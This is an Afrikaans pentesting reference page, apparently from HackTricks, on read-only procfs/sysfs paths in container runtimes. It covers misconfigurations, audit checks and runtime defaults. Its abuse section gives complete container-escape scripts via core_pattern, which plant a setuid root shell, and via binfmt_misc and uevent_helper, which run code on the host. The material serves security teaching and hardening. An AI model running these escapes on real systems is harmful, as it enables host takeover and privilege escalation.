# Lees-alleen stelselpade

{{#include ../../../../banners/hacktricks-training.md}}

Lees-alleen stelselpade is 'n aparte beskerming van masked paths. In plaas daarvan om 'n pad heeltemal te verberg, stel die runtime dit bloot maar mount dit as lees-alleen. Dit is algemeen vir geselekteerde procfs en sysfs lokasies waar lees-toegang aanvaarbaar of bedryfsnoodsaaklik kan wees, maar skryf te gevaarlik sou wees.

Die doel is reguittoe: baie kernel-koppelvlakke word veel gevaarliker wanneer dit skryfbaar is. 'n Lees-alleen mount verwyder nie alle verkenningswaarde nie, maar dit verhoed dat 'n gekompromitteerde workload die onderliggende lêers wat met die kernel kommunikeer via daardie pad wysig.

## Werking

Runtimes merk dikwels dele van die proc/sys aansig as lees-alleen. Afhangend van die runtime en gasheer, kan dit pades insluit soos:

- `/proc/sys`
- `/proc/sysrq-trigger`
- `/proc/irq`
- `/proc/bus`

Die werklike lys wissel, maar die model is dieselfde: laat sigbaarheid toe waar nodig, keer wysiging per verstek.

## Laboratorium

Inspekteer die deur Docker verklaarde lees-alleen padlys:
```bash
docker inspect <container> | jq '.[0].HostConfig.ReadonlyPaths'
```
Inspekteer die gemonteerde proc/sys-aansig van binne die container:
```bash
mount | grep -E '/proc|/sys'
find /proc/sys -maxdepth 2 -writable 2>/dev/null | head
find /sys -maxdepth 3 -writable 2>/dev/null | head
```
## Sekuriteitsimpak

Lees-alleen stelselspaaie beperk ’n groot klas misbruik wat die gasheer beïnvloed. Selfs wanneer ’n aanvaller procfs of sysfs kan inspekteer, verwyder die onmoontlikheid om daar te skryf baie direkte wysigingspade wat kernel tunables, crash handlers, module-loading helpers of ander control interfaces betrek. Die blootstelling verdwyn nie, maar die oorgang van inligtingsontblootstelling na invloed op die gasheer word moeiliker.

## Misconfigurasies

Die hooffoute is om sensitiewe paaie te unmask of te remount as lees-skryf, om die gasheer se proc/sys-inhoud direk bloot te stel met writable bind mounts, of om privileged modes te gebruik wat effektief die veiliger runtime-standaarde omseil. In Kubernetes gaan `procMount: Unmasked` en privileged workloads dikwels saam met swakker proc-beskerming. ’n Ander algemene operasionele fout is om aan te neem dat omdat die runtime gewoonlik hierdie paaie lees-alleen mount, alle workloads steeds daardie standaard erf.

## Misbruik

As die beskerming swak is, begin deur te kyk vir writable proc/sys entries:
```bash
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50   # Find writable kernel tunables reachable from the container
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50        # Find writable sysfs entries that may affect host devices or kernel state
```
Wanneer skryfbare inskrywings teenwoordig is, sluit hoogs waardevolle opvolgpaaie in:
```bash
cat /proc/sys/kernel/core_pattern 2>/dev/null        # Crash handler path; writable access can lead to host code execution after a crash
cat /proc/sys/kernel/modprobe 2>/dev/null            # Kernel module helper path; useful to evaluate helper-path abuse opportunities
cat /proc/sys/fs/binfmt_misc/status 2>/dev/null      # Whether binfmt_misc is active; writable registration may allow interpreter-based code execution
cat /proc/sys/vm/panic_on_oom 2>/dev/null            # Global OOM handling; useful for evaluating host-wide denial-of-service conditions
cat /sys/kernel/uevent_helper 2>/dev/null            # Helper executed for kernel uevents; writable access can become host code execution
```
What these commands can reveal:

- Skryfbare inskrywings onder `/proc/sys` beteken dikwels dat die container die host kernel-gedrag kan wysig eerder as net dit te bekyk.
- `core_pattern` is veral belangrik omdat 'n skryfbare, na die host gerigte waarde in 'n host code-execution path omskep kan word deur 'n proses te laat crash ná die instel van 'n pipe handler.
- `modprobe` toon die helper wat deur die kernel gebruik word vir module-loading verwante flows; dit is 'n klassieke hoë-waarde teiken wanneer dit skryfbaar is.
- `binfmt_misc` vertel jou of pasgemaakte interpreter-registrasie moontlik is. As die registrasie skryfbaar is, kan dit 'n execution primitive word in plaas van net 'n information leak.
- `panic_on_oom` beheer 'n host-wye kernel-besluit en kan dus resource exhaustion omskep in 'n host denial of service.
- `uevent_helper` is een van die duidelikste voorbeelde van 'n skryfbare sysfs helper-pad wat host-context uitvoering produseer.

Interessante bevindinge sluit skryfbare, na die host gerigte proc-knoppies of sysfs-inskrywings in wat normaalweg net-leesbaar moes wees. Op daardie punt het die workload verskuif van 'n beperkte container-uitsig na betekenisvolle kernel-invloed.

### Volledige voorbeeld: `core_pattern` Host Escape

If `/proc/sys/kernel/core_pattern` is writable from inside the container and points to the host kernel view, it can be abused to execute a payload after a crash:
```bash
[ -w /proc/sys/kernel/core_pattern ] || exit 1
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /shell.sh
#!/bin/sh
cp /bin/sh /tmp/rootsh
chmod u+s /tmp/rootsh
EOF
chmod +x /shell.sh
echo "|$overlay/shell.sh" > /proc/sys/kernel/core_pattern
cat <<'EOF' > /tmp/crash.c
int main(void) {
char buf[1];
for (int i = 0; i < 100; i++) buf[i] = 1;
return 0;
}
EOF
gcc /tmp/crash.c -o /tmp/crash
/tmp/crash
ls -l /tmp/rootsh
```
As die pad werklik die gasheer-kern bereik, word die payload op die gasheer uitgevoer en laat 'n setuid shell agter.

### Volledige voorbeeld: `binfmt_misc` Registrasie

As `/proc/sys/fs/binfmt_misc/register` skryfbaar is, kan 'n aangepaste interpreter-registrasie kode-uitvoering veroorsaak wanneer die ooreenstemmende lêer uitgevoer word:
```bash
mount | grep binfmt_misc || mount -t binfmt_misc binfmt_misc /proc/sys/fs/binfmt_misc
cat <<'EOF' > /tmp/h
#!/bin/sh
id > /tmp/binfmt.out
EOF
chmod +x /tmp/h
printf ':hack:M::HT::/tmp/h:\n' > /proc/sys/fs/binfmt_misc/register
printf 'HT' > /tmp/test.ht
chmod +x /tmp/test.ht
/tmp/test.ht
cat /tmp/binfmt.out
```
Op 'n host-gerigte skryfbare `binfmt_misc` lei dit tot kode-uitvoering in die interpreter-pad wat deur die kernel geaktiveer word.

### Volledige voorbeeld: `uevent_helper`

As `/sys/kernel/uevent_helper` skryfbaar is, kan die kernel 'n host-pad helper aanroep wanneer 'n ooreenstemmende gebeurtenis geaktiveer word:
```bash
cat <<'EOF' > /tmp/evil-helper
#!/bin/sh
id > /tmp/uevent.out
EOF
chmod +x /tmp/evil-helper
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$overlay/tmp/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /tmp/uevent.out
```
Die rede waarom dit so gevaarlik is, is dat die helper path vanaf die host filesystem-perspektief opgelos word eerder as vanuit 'n veilige container-only konteks.

## Kontroles

Hierdie kontroles bepaal of procfs/sysfs blootstelling read-only is waar dit verwag word en of die workload steeds sensitiewe kernel interfaces kan wysig.
```bash
docker inspect <container> | jq '.[0].HostConfig.ReadonlyPaths'   # Runtime-declared read-only paths
mount | grep -E '/proc|/sys'                                      # Actual mount options
find /proc/sys -maxdepth 2 -writable 2>/dev/null | head           # Writable procfs tunables
find /sys -maxdepth 3 -writable 2>/dev/null | head                # Writable sysfs paths
```
Wat hier interessant is:

- 'n Normale geharde workload behoort baie min skryfbare /proc/sys-items bloot te stel.
- Skryfbare `/proc/sys`-paadjies is dikwels belangriker as gewone lees-toegang.
- As die runtime sê 'n pad is read-only maar dit in die praktyk skryfbaar is, hersien mount propagation, bind mounts en privilege-instellings noukeurig.

## Runtime-standaarde

| Runtime / platform | Standaardstatus | Standaardgedrag | Algemene handmatige verzwakking |
| --- | --- | --- | --- |
| Docker Engine | Aangeskakel per verstek | Docker definieer 'n versteklys van read-only-paadjies vir sensitiewe proc-items | exposing host proc/sys mounts, `--privileged` |
| Podman | Aangeskakel per verstek | Podman pas verstek read-only-paadjies toe tensy uitdruklik versoepel | `--security-opt unmask=ALL`, broad host mounts, `--privileged` |
| Kubernetes | Erf runtime-verstekke | Gebruik die onderliggende runtime read-only-padmodel tensy dit verswakked word deur Pod-instellings of host mounts | `procMount: Unmasked`, privileged workloads, writable host proc/sys mounts |
| containerd / CRI-O under Kubernetes | Runtime-verstek | Gewoonlik staatgemaak op OCI/runtime-verstekke | dieselfde as die Kubernetes-ry; direkte runtime-konfigurasiewijzigings kan die gedrag verswak |

Die kernpunt is dat read-only stelselpaadjies gewoonlik as 'n runtime-verstek teenwoordig is, maar dit is maklik om te ondermyn met privileged-modi of host bind mounts.
